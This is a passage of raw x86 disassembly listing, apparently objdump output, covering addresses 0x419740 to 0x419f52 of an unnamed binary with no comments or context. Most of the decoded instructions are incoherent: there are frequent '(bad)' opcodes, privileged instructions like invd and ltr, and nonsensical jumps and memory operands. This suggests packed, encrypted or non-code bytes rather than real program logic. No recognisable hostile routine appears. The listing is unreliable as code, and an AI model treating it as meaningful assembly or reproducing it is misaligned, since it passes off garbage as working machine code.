  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
